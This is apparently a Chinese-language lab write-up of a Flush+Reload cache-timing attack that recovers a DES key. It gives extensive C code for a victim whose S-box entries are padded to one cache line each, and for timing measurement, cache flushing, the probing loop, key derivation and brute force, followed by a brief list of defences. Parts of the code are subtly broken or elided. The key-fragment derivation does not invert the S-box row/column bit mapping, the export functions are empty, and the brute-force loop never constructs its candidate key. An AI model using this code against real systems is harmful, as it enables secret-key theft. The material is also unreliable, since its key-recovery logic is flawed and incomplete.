## 1. 攻击概述

### 1.1 什么是 Flush+Reload 攻击

Flush+Reload 是一种**缓存侧信道攻击（Cache Side-Channel Attack）**，利用 CPU 缓存的时间差异来推断程序的执行路径和访问的数据。

**基本原理：**
```
1. Flush: 攻击者将目标内存地址从缓存中驱逐（clflush 指令）
2. Victim: 受害者程序执行，如果访问了该地址，数据被加载到缓存
3. Reload: 攻击者重新访问该地址，测量访问时间
   - 时间短（缓存命中）→ 受害者访问过该地址
   - 时间长（缓存未命中）→ 受害者未访问该地址
```

### 1.2 攻击目标：DES 密钥

**DES 加密特点：**
- 64 位密钥（实际有效 56 位，8 位奇偶校验）
- 16 轮 Feistel 网络结构
- 每轮使用 48 位轮密钥（K1-K16）
- **攻击目标**：恢复第一轮轮密钥 K1（48 位），进而恢复完整 64 位密钥

**攻击可行性：**
- DES 使用 8 个 S-box，每个 S-box 访问 64 个条目中的一个
- S-box 条目访问模式与轮密钥直接相关
- 通过监控 S-box 访问，可以推断轮密钥的 48 位

## 2. 核心原理

### 2.1 DES 第一轮与 S-box 访问

```
明文 (64位)
    ↓
初始置换 (IP)
    ↓
L0 (32位) || R0 (32位)
            ↓
        E扩展 (32→48位)
            ↓
        ⊕ K1 (48位轮密钥) ← 攻击目标
            ↓
        分成8个6位块
            ↓
        S-box替换 (6→4位)
        ├─ S1: 输入6位 → 查表 → 输出4位
        ├─ S2: 输入6位 → 查表 → 输出4位
        │   ...
        └─ S8: 输入6位 → 查表 → 输出4位
```

**关键观察：**
- 每个 S-box 接收 6 位输入（E(R0) 的对应位 ⊕ K1 的对应位）
- 6 位输入决定访问 64 个条目中的哪一个
- 如果知道访问了哪个条目，可以反推 6 位输入
- 8 个 S-box × 6 位 = 48 位 K1

### 2.2 从 S-box 条目反推 K1

```
已知：
- R0（从明文计算得到）
- E(R0)（R0 经过 E 扩展后的 48 位）
- S-box 访问的条目编号（0-63）

推导过程：
1. 从条目编号计算行号和列号：
   row = entry / 16    (0-3)
   col = entry % 16    (0-15)

2. 6 位 S-box 输入 = (row << 4) | col

3. K1 的 6 位片段 = 6 位 S-box 输入 ⊕ E(R0) 的对应 6 位

4. 重复 8 次，得到完整的 48 位 K1
```

### 2.3 从 K1 恢复完整密钥

**PC-2 密钥调度：**
```
56位密钥 (CnDn)
    ↓
PC-2 置换选择
    ↓
48位轮密钥 Kn
```

**关键：** PC-2 丢弃了 8 位，因此从 K1 只能直接恢复 48 位，剩余 8 位需要暴力枚举（2^8 = 256 种可能）。

### 3.3 关键数据结构

#### des.c - SBox 结构

```c
/**
 * SBox 结构：每个条目占 64 字节（1个缓存行）
 * 
 * data[64][16]：
 * - 64 个条目（对应 6 位输入 0-63）
 * - 每个条目 16 个 uint32_t = 64 字节
 * - 实际只使用 data[i][0]，其余用于填充对齐
 * 
 * __attribute__((aligned(4096)))：4KB 页对齐
 */
typedef struct {
    uint32_t data[64][16];  // 64 条目 × 64 字节 = 4096 字节
} __attribute__((aligned(4096))) SBox;

static SBox S[8];  // 8 个 S-box，每个占 4KB
```

**内存布局：**
```
S[0]: 条目0 (64B) | 条目1 (64B) | ... | 条目63 (64B) | = 4096B
S[1]: 条目0 (64B) | 条目1 (64B) | ... | 条目63 (64B) | = 4096B
...
S[7]: 条目0 (64B) | 条目1 (64B) | ... | 条目63 (64B) | = 4096B
```

每个条目占用独立的缓存行，攻击者可以通过检测哪个缓存行被访问，确定访问了哪个条目。

## 4. 代码详解

### 4.1 des.c - 受害者代码

#### 4.1.1 S-box 替换函数（攻击目标）

```c
static uint32_t s_box_substitution(uint64_t input) {
    uint32_t output = 0;
    
    for (uint8_t i = 0; i < 8; i++) {
        // 提取第 i 个 6 位块
        uint8_t block = (input >> (42 - i * 6)) & 0x3F;
        
        // 计算行和列
        uint8_t row = (((block >> 5) & 0x1) << 1) | (block & 0x1);
        uint8_t col = (block >> 1) & 0xF;
        
        // 计算条目索引
        uint8_t index = row * 16 + col;  // 0-63
        
        // 关键：访问 S-box 条目（触发缓存加载）
        uint8_t s_val = S[i].data[index][0];
        
        output = (output << 4) | s_val;
    }
    return output;
}
```

**攻击关键：** 访问 `S[i].data[index][0]` 会将该内存位置加载到 CPU 缓存。

#### 4.1.2 第一轮加密（攻击入口）

```c
void des_encrypt_first_round(uint64_t plaintext, uint64_t key, uint64_t *result) {
    uint64_t round_keys[16];
    generate_round_keys(key, round_keys);
    
    uint64_t ip = permute(plaintext, IP, 64, 64);
    uint32_t L = (uint32_t)(ip >> 32);
    uint32_t R = (uint32_t)(ip & 0xFFFFFFFF);
    
    // 只执行第一轮
    uint32_t temp = R;
    R = L ^ des_f(R, round_keys[0]);  // 使用 K1
    L = temp;
    
    *result = ((uint64_t)L << 32) | (uint64_t)R;
}
```

#### 4.1.3 导出函数（供攻击者调用）

```c
// 导出 S-box 地址，使攻击者能访问相同的内存

// 导出完整加密，用于验证恢复的密钥
```

#### 4.2.2 缓存时间测量

```c
/**
 * rdtsc - 读取时间戳计数器
 * 
 * RDTSC 指令返回 CPU 自复位以来的时钟周期数
 * 用于高精度时间测量
 */
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

/**
 * measure_time_single - 测量访问单个地址的时间
 */
static inline uint64_t measure_time_single(const void *addr) {
    uint64_t t0, t1;
    
    // 内存屏障：确保之前的指令已完成
    asm volatile ("mfence" ::: "memory");
    
    t0 = rdtsc();  // 开始时间
    
    // 访问目标地址（volatile 防止编译器优化）
    *(volatile uint64_t*)addr;
    
    t1 = rdtsc();  // 结束时间
    
    asm volatile ("mfence" ::: "memory");
    
    return t1 - t0;  // 返回时钟周期数
}

/**
 * flush_cache_line - 将地址从缓存驱逐
 */
static inline void flush_cache_line(const void *addr) {
    asm volatile ("clflush (%0)" :: "r"(addr) : "memory");
}
```

#### 4.2.3 阈值校准

```c
/**
 * calibrate_threshold - 校准缓存命中/未命中的时间阈值
 * 
 * 原理：
 * 1. 多次访问同一地址（确保在缓存中），测量时间 → 命中时间
 * 2. 刷新后访问，测量时间 → 未命中时间
 * 3. 阈值取中间值
 */
uint64_t calibrate_threshold() {
    int *test_array = aligned_alloc(64, 64 * 64);
    
    // 测量命中时间（数据在缓存中）
    for (int i = 0; i < 10000; i++) {
        test_array[0] = i;  // 访问使其进入缓存
        uint64_t t = measure_time_single(&test_array[0]);
        hit_times[i] = t;
    }
    
    // 测量未命中时间（数据不在缓存中）
    for (int i = 0; i < 10000; i++) {
        flush_cache_line(&test_array[0]);  // 驱逐
        uint64_t t = measure_time_single(&test_array[0]);
        miss_times[i] = t;
    }
    
    // 计算中位数并确定阈值
    uint64_t median_hit = calculate_median(hit_times, 10000);
    uint64_t median_miss = calculate_median(miss_times, 10000);
    
    // 阈值 = 命中时间 + (未命中时间 - 命中时间) / 5
    // 留 20% 安全余量偏向命中侧
    uint64_t threshold = median_hit + (median_miss - median_hit) / 5;
    
    return threshold;
}
```

#### 4.2.4 第一轮攻击（核心）

```c
/**
 * first_round_attack - 检测每个 S-box 访问的条目
 * 
 * 修复后的攻击逻辑（避免 CPU 预取器干扰）：
 * 对每个 S-box 的每个条目单独进行 Flush+Reload
 */
void first_round_attack(uint32_t R, uint64_t K, int *detected_entries) {
    int hit_counts[SBOX_COUNT][64] = {0};  // 命中计数矩阵
    
    // 外层循环：遍历每个 S-box
    for (int sbox = 0; sbox < SBOX_COUNT; sbox++) {
        
        // 中层循环：遍历该 S-box 的 64 个条目
        for (int entry = 0; entry < 64; entry++) {
            void *target_addr = (void*)&S[sbox].data[entry][0];
            
            // 内层循环：对该条目进行多次测试
            for (int iter = 0; iter < ATTACK_ITERATIONS / 64; iter++) {
                
                // 步骤 1：Flush - 驱逐目标条目
                flush_cache_line(target_addr);
                asm volatile ("mfence" ::: "memory");
                
                // 步骤 2：Trigger - 受害者执行 DES 第一轮
                uint64_t result;
                des_encrypt_first_round(TEST_PLAINTEXT, K, &result);
                asm volatile ("mfence" ::: "memory");
                
                // 步骤 3：Reload - 测量访问时间
                uint64_t time = measure_time_single(target_addr);
                if (time < g_threshold) {
                    hit_counts[sbox][entry]++;  // 缓存命中！
                }
            }
        }
    }
    
    // 分析结果：找出每个 S-box 最可能被访问的条目
    for (int sbox = 0; sbox < SBOX_COUNT; sbox++) {
        int best_entry = -1;
        int best_count = 0;
        
        for (int entry = 0; entry < 64; entry++) {
            if (hit_counts[sbox][entry] > best_count) {
                best_count = hit_counts[sbox][entry];
                best_entry = entry;
            }
        }
        
        // 置信度检查
        if (best_count >= (ATTACK_ITERATIONS / 64) * 0.3) {
            detected_entries[sbox] = best_entry;
        } else {
            detected_entries[sbox] = -1;  // 检测失败
        }
    }
}
```

#### 4.2.5 从检测到的条目推导 K1

```c
/**
 * derive_k1_fragment - 从 S-box 条目推导 K1 的 6 位片段
 */
uint8_t derive_k1_fragment(int sbox, int entry, uint64_t E_R0) {
    // 从条目号计算行和列
    int row = entry / 16;
    int col = entry % 16;
    
    // 6 位 S-box 输入
    uint8_t s_input = (row << 4) | col;
    
    // 提取 E(R0) 的对应 6 位
    uint8_t e_bits = (E_R0 >> ((7 - sbox) * 6)) & 0x3F;
    
    // K1 片段 = S-box 输入 ⊕ E(R0) 片段
    uint8_t k1_fragment = s_input ^ e_bits;
    
    return k1_fragment;
}
```

#### 4.2.6 多轮投票机制

```c
/**
 * 执行多轮攻击，通过投票选择最可靠的 K1
 */
#define MAX_ROUNDS 7

uint64_t k1_candidates[MAX_ROUNDS] = {0};  // K1 候选值数组
int k1_confidence[MAX_ROUNDS] = {0};       // 每个候选的出现次数

for (int round = 0; round < MAX_ROUNDS; round++) {
    // 执行攻击，得到当前轮的 K1
    int detected_entries[8];
    first_round_attack(R0, key, detected_entries);
    
    uint64_t current_K1 = 0;
    for (int sbox = 0; sbox < 8; sbox++) {
        if (detected_entries[sbox] >= 0) {
            uint8_t fragment = derive_k1_fragment(sbox, detected_entries[sbox], E_R0);
            current_K1 |= ((uint64_t)fragment) << ((7 - sbox) * 6);
        }
    }
    
    // 投票：检查是否已有相同的 K1
    bool found = false;
    for (int i = 0; i < MAX_ROUNDS; i++) {
        if (k1_candidates[i] == current_K1 && k1_confidence[i] > 0) {
            k1_confidence[i]++;  // 已有相同候选，置信度+1
            found = true;
            break;
        }
    }
    
    // 新候选，添加到空位
    if (!found) {
        for (int i = 0; i < MAX_ROUNDS; i++) {
            if (k1_confidence[i] == 0) {
                k1_candidates[i] = current_K1;
                k1_confidence[i] = 1;
                break;
            }
        }
    }
}

// 选择置信度最高的 K1
int best_idx = 0;
for (int i = 1; i < MAX_ROUNDS; i++) {
    if (k1_confidence[i] > k1_confidence[best_idx]) {
        best_idx = i;
    }
}
uint64_t derived_K1 = k1_candidates[best_idx];
```

#### 4.2.7 暴力搜索剩余 8 位

```c
/**
 * 从 K1 恢复 64 位密钥
 * 
 * PC-2 丢弃了 8 位，需要暴力枚举 2^8 = 256 种可能
 */
for (int missing = 0; missing < 256; missing++) {

    des_encrypt_full(TEST_PLAINTEXT, candidate, &test_result);
    
    if (test_result == expected_ciphertext) {
        recovered_key = candidate;

    }
}
```

## 6. 关键技术点

### 6.1 缓存行对齐

```c
typedef struct {
    uint32_t data[64][16];  // 64 条目 × 64 字节
} __attribute__((aligned(4096))) SBox;
```

**为什么这样设计？**
- x86_64 CPU 缓存行大小通常为 64 字节
- 每个 S-box 条目占 64 字节 = 恰好一个缓存行
- 访问条目 i 只会加载条目 i 到缓存，不会预取相邻条目
- 攻击者可以精确区分访问了哪个条目

### 6.2 CPU 亲和性绑定

```c
static void pin_to_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
}
```

**目的：**
- 将攻击者和受害者绑定到同一 CPU 核心
- 确保两者使用相同的 L1/L2 缓存
- 提高攻击成功率

### 6.3 内存屏障（Memory Fence）

```c
asm volatile ("mfence" ::: "memory");
```

**作用：**
- 确保之前的内存操作已完成
- 防止 CPU 乱序执行影响时间测量精度
- 在 Flush 和 Reload 之间建立同步点

### 6.4 时间戳计数器（RDTSC）

```c
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}
```

**特点：**
- 读取 CPU 内部时间戳计数器
- 精度为 CPU 时钟周期（纳秒级）
- 用于精确测量内存访问时间

## 7. 问题与修复

### 7.1 原始代码的问题

**问题：CPU 预取器干扰**

```c
// 原始代码（失败版本）
for (int iter = 0; iter < ATTACK_ITERATIONS; iter++) {
    // 1. Flush 所有 64 个条目
    for (int entry = 0; entry < 64; entry++) {
        flush_cache_line(&S[sbox].data[entry][0]);
    }
    
    // 2. 受害者执行
    des_encrypt_first_round(...);
    
    // 3. 按顺序探测所有条目 ← 问题在这里！
    for (int entry = 0; entry < 64; entry++) {
        time = measure_time(&S[sbox].data[entry][0]);
        // 记录命中...
    }
}
```

**问题原因：**
- 现代 CPU 有硬件预取器
- 按顺序访问内存时，预取器会提前加载后续地址
- 探测过程本身将所有条目加载到缓存
- 几乎所有条目都显示为"命中"，无法区分

### 7.2 修复方案

```c
// 修复后的代码（成功版本）
// 对每个条目单独进行 Flush+Reload
for (int entry = 0; entry < 64; entry++) {
    void *target_addr = (void*)&S[sbox].data[entry][0];
    
    for (int iter = 0; iter < ATTACK_ITERATIONS / 64; iter++) {
        // 1. Flush 目标条目
        flush_cache_line(target_addr);
        asm volatile ("mfence" ::: "memory");
        
        // 2. 受害者执行
        des_encrypt_first_round(...);
        asm volatile ("mfence" ::: "memory");
        
        // 3. 只探测这一个条目！
        uint64_t time = measure_time_single(target_addr);
        if (time < g_threshold) {
            hit_counts[sbox][entry]++;
        }
    }
}
```

**修复原理：**
- 每次只测试一个条目
- 避免按顺序访问多个地址触发预取器
- 每个条目独立进行 Flush-Trigger-Measure 循环

### 7.3 阈值计算溢出修复

**问题：**
```c
// 原始代码
uint64_t threshold = median_hit + (median_miss - median_hit) / 5;
// 当 median_miss < median_hit 时，减法溢出！
```

**修复：**
```c
uint64_t threshold;
if (median_miss <= median_hit) {
    // 测量异常，使用固定阈值
    threshold = median_hit + 50;
} else {
    // 正常情况：阈值取中间值，留 20% 安全余量
    threshold = median_hit + (median_miss - median_hit) / 5;
}
```

## 8. 总结

### 8.1 攻击成功要素

| 要素 | 说明 |
|------|------|
| **共享内存** | 攻击者和受害者共享 S-box 内存页 |
| **缓存时间差** | 命中 (~200 周期) vs 未命中 (~400 周期) |
| **精确测量** | RDTSC 提供纳秒级时间精度 |
| **避免预取** | 单独测试每个条目，避免 CPU 预取干扰 |
| **多轮投票** | 7 轮攻击投票，提高可靠性 |
| **暴力枚举** | 256 次尝试恢复 8 个未知位 |

### 8.2 防御措施

1. **禁用共享内存**：不要与不可信程序共享库
2. **缓存刷新**：加密前后执行 `clflush` 清除敏感数据
3. **常数时间实现**：使用查表无关的 S-box 实现
4. **硬件防御**：使用支持缓存分区的新 CPU
5. **随机化**：地址空间布局随机化（ASLR）增加攻击难度
